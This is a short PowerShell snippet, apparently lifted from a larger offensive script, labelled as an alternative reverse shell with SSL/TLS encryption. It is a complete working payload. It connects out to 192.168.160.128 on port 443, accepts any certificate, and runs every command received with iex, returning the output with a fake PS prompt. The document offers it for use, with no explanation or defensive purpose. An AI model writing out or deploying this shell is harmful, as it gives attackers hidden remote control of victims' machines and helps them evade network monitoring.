
# Alternative: Reverse Shell with SSL/TLS Encryption (Uncomment if needed)
<
$ip = "192.168.160.128"; $port = 443
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$sslStream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, { $true })
$sslStream.AuthenticateAsClient("")
while ($true) {
    $buffer = New-Object byte[] 1024
    $bytesRead = $sslStream.Read($buffer, 0, $buffer.Length)
    if ($bytesRead -eq 0) { break }
    $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
    $output = (iex $command 2>&1 | Out-String)
    $response = $output + "PS " + (pwd).Path + "> "
    $responseBytes = [System.Text.Encoding]::ASCII.GetBytes($response)
    $sslStream.Write($responseBytes, 0, $responseBytes.Length)
    $sslStream.Flush()
}
$client.Close()
>



